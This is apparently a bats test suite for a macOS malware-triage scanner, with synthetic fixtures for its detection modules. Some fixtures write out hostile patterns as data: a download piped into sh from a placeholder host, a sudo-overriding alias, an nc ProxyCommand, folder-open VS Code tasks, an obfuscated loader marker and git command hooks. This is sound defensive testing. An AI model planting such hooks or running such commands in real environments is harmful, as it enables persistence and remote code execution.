#!/usr/bin/env bats
# Detection tests with synthetic fixtures (no real malware).
# Strings that look like malware traits are assembled at runtime so that
# mac-triage scanning this repository does not flag its own test files.

load ../helpers

setup(){ make_env; }
teardown(){ drop_env; }

mod(){ MODULE="$1" PATH="$REPO/tests/stubs:/usr/bin:/bin:/usr/sbin:/sbin" run /bin/bash "$(ls "$SRC"/modules/"$1"-*.sh)"; }

@test "07 flags a shell config that pipes a download into sh" {
  printf 'export X=1\n%s http://example.invalid/x | sh\n' "cu""rl" > "$UH/.zshrc"
  mod 07
  grep -q "^\[07\] Suspicious command in $UH/.zshrc" "$RUN/.flags.raw"
}

@test "07 flags an alias that overrides sudo" {
  printf "alias sudo='%s'\n" "/tmp/x" > "$UH/.zshrc"
  mod 07
  grep -q "Shell overrides a sensitive command" "$RUN/.flags.raw"
}

@test "17 flags a VS Code task that runs when the folder opens" {
  mkdir -p "$UH/proj/.vscode"
  printf '{"version":"2.0.0","tasks":[{"label":"x","command":"node x.js","runOptions":{"runOn":"%s"}}]}\n' "folder""Open" > "$UH/proj/.vscode/tasks.json"
  mod 17
  grep -q "Task auto-runs on folder open: $UH/proj/.vscode/tasks.json" "$RUN/.flags.raw"
}

@test "17 flags the known injected loader marker in project source" {
  mkdir -p "$UH/proj"
  printf 'const a=1;var %s=["x"];\n' "_\$_5e""f4" > "$UH/proj/index.js"
  mod 17
  grep -q "Injected malware marker found: $UH/proj/index.js" "$RUN/.flags.raw"
}

@test "17 flags a config file with an abnormally long line" {
  mkdir -p "$UH/proj"
  { printf 'module.exports={};'; printf ' %.0s' $(seq 1 1100); printf 'x\n'; } > "$UH/proj/next.config.js"
  mod 17
  grep -q "Config file with an abnormally long line: $UH/proj/next.config.js" "$RUN/.flags.raw"
}

@test "16 flags an SSH config that runs commands and a non-default npm registry" {
  mkdir -p "$UH/.ssh"
  printf 'Host x\n  ProxyCommand nc %%h %%p\n' > "$UH/.ssh/config"
  printf 'registry=https://registry.example.invalid/\n' > "$UH/.npmrc"
  mod 16
  grep -q "SSH config can run commands" "$RUN/.flags.raw"
  grep -q "Non-default package registry configured" "$RUN/.flags.raw"
}

@test "15 flags an unpacked (sideloaded) Chromium extension" {
  p="$UH/Library/Application Support/FakeBrowser/Default"
  mkdir -p "$p/Extensions/abcdefghijklmnop/1.0"
  printf '{"name":"Fixture","version":"1.0","permissions":["cookies"]}\n' > "$p/Extensions/abcdefghijklmnop/1.0/manifest.json"
  printf '{"extensions":{"settings":{"abcdefghijklmnop":{"location":4,"path":"/tmp/x"}}}}\n' > "$p/Secure Preferences"
  mod 15
  grep -q "Unpacked (sideloaded) extension in FakeBrowser Default" "$RUN/.flags.raw"
  grep -q "FakeBrowser | Default | abcdefghijklmnop | Fixture" "$INV/browser_ext.txt"
}

yara_rules(){
  [ -x /opt/homebrew/bin/yarac ] || skip "YARA is not installed"
  /opt/homebrew/bin/yarac -w "$SRC/rules/custom.yar" "$TEST_TMP/custom.yarc"
}

@test "custom YARA rule matches a synthetic loader and not clean JavaScript" {
  yara_rules
  printf 'var %s=["a"];global[_$_5ef4[0x0]]=%s;\n' "_\$_5e""f4" "req""uire" > "$TEST_TMP/loader.txt"
  printf 'const fs = require("fs");\nconsole.log(fs.existsSync("x"));\n' > "$TEST_TMP/clean.js"
  run /opt/homebrew/bin/yara -C "$TEST_TMP/custom.yarc" "$TEST_TMP/loader.txt"
  [[ "$output" == *"MacTriage_JS_GlobalRequire_Loader"* ]] || return 1
  run /opt/homebrew/bin/yara -C "$TEST_TMP/custom.yarc" "$TEST_TMP/clean.js"
  [ -z "$output" ]
}

@test "ClamAV detects the EICAR test string" {
  [ -x /opt/homebrew/bin/clamscan ] || skip "ClamAV is not installed"
  ls /opt/homebrew/var/lib/clamav/*.c[lv]d >/dev/null 2>&1 || skip "ClamAV has no signature database"
  printf '%s%s' 'X5O!P%@AP[4\PZX54(P^)7CC)7}$EICAR' '-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*' > "$TEST_TMP/eicar.txt"
  run /opt/homebrew/bin/clamscan --no-summary "$TEST_TMP/eicar.txt"
  [[ "$output" == *"FOUND"* ]] || return 1
}

@test "17 flags a repository git config that can run commands, with file:line" {
  mkdir -p "$UH/proj/.git"
  printf '[core]\n\tfsmonitor = ./hook.sh\n' > "$UH/proj/.git/config"
  mod 17
  grep -qF "Repo git config can execute commands: $UH/proj/.git/config:	fsmonitor = ./hook.sh" "$RUN/.flags.raw"
}

@test "17 ignores a symlinked tasks.json" {
  mkdir -p "$UH/proj/.vscode" "$TEST_TMP/elsewhere"
  printf '{"runOn":"%s"}\n' "folder""Open" > "$TEST_TMP/elsewhere/tasks.json"
  ln -s "$TEST_TMP/elsewhere/tasks.json" "$UH/proj/.vscode/tasks.json"
  mod 17
  not grep -q "Task auto-runs" "$RUN/.flags.raw"
}

@test "16 flags git settings that run commands, with file:line" {
  printf '[core]\n\tpager = less -R\n' > "$UH/.gitconfig"
  mod 16
  grep -qF "Git setting that can run commands (verify): $UH/.gitconfig:	pager = less -R" "$RUN/.flags.raw"
}
